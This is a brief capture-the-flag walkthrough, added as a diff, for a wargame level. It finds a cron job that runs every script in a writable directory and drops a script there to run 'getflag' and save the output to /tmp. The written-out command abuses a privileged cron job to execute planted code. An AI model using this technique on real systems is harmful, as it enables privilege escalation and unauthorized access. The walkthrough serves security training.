@@ -1,0 +1,14 @@
+* we can see "you have a new mail"
+- cat cat /var/mail/level05
+
+* it is a cron job
+* "sh /usr/sbin/openarenaserver" is launch every 2nd minute
+- cat /usr/sbin/openarenaserver
+
+* /usr/sbin/openarenaserver launch all script in /opt/openarenaserver/
+* so we can create script : launch getflag and store output
+
+- echo 'getflag > /tmp/toto' > /opt/openarenaserver/tata
+
+* juste wait 2 minute
+- cat /tmp/toto
